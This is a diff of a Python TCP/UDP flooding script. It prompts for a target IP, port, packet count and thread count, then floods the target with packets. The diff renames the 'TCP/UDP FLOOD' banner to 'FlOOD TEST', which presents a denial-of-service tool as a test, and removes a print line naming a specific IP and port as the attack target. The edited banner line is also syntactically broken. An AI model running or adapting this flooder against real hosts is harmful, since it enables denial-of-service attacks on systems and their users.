@@ -1,13 +1,11 @@
-#!/usr/bin/env python3
-#Code by LeeOn123
 import random
 import socket
 import threading
 
-print("TCP/UDP FLOOD")
+print("FlOOD TEST)
 ip = str(input(" Ip:"))
 port = int(input(" Port:"))
-choice = str(input(" UDP(1/2):"))
+choice = str(input(" UDP/TCP(1/2):"))
 times = int(input(" Packets:"))
 threads = int(input(" Threads:"))
 def run():
@@ -19,7 +17,7 @@ def run():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i +" --------------------> Attack to 199.91.193.170:50034 ")
+			print(i +" Sent")
 		except:
 			print("[!] Error")
 
@@ -33,7 +31,7 @@ def run2():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i +" Sent!!!")
+			print(i +" Sent")
 		except:
 			s.close()
 			print("[*] Error")
